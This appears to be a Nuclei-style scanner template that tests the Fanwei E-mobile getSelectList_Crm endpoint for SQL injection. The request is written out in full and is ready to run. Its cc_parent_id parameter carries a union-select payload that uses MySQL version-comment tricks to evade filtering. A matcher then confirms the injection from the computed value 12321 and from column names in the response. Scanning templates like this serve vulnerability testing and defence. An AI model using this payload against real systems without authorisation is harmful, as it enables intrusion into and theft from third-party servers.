id: fanwei-getselectlist-crm-sqli

info:
  name: fanwei-getselectlist-crm-sqli
  author: fanwei-getselectlist-crm-sqli

requests:
  - raw:
      - |
        POST /E-mobile/App/Init.php?m=getSelectList_Crm HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Connection: close
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded
        
        cc_parent_id={{url_encode("-999 /*!50000union*/ /*!50000select*/ 1,111*111#")}}

    matchers:

      - type: dsl
        dsl:
          - "contains_all(body_1,'12321','CC_VALUE','CC_NAME')"



